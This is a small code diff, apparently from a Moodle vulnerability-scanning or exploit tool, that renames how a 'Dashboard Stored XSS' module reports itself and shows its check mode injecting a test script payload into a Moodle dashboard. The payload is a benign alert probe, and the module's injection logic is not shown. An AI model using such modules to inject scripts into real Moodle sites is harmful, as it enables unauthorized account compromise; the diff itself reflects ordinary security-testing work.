@@ -11,6 +11,7 @@ This allows an attacker who already compromised an user's Moodle account to esca
 '''
 
 
+name = 'Dashboard Stored XSS'
 enabled = True
 
 
@@ -111,7 +112,7 @@ def inject(url, sess, payload, verbose, check_mode=False):
 # check mode: insert hardcoded script, check if injected and then remove it
 def check(args, sess, version):
 	if args.auth is None:
-		print('[-] Vulnerability "{}" requires authentication, skipping...'.format(__name__.split('.', 1)[1]))
+		print('[-] Vulnerability "{}" requires authentication, skipping...'.format(name))
 		return False
 	
 	return inject(args.url, sess, '<script>alert(\'vulnerable!\')</script>', args.verbose, True)
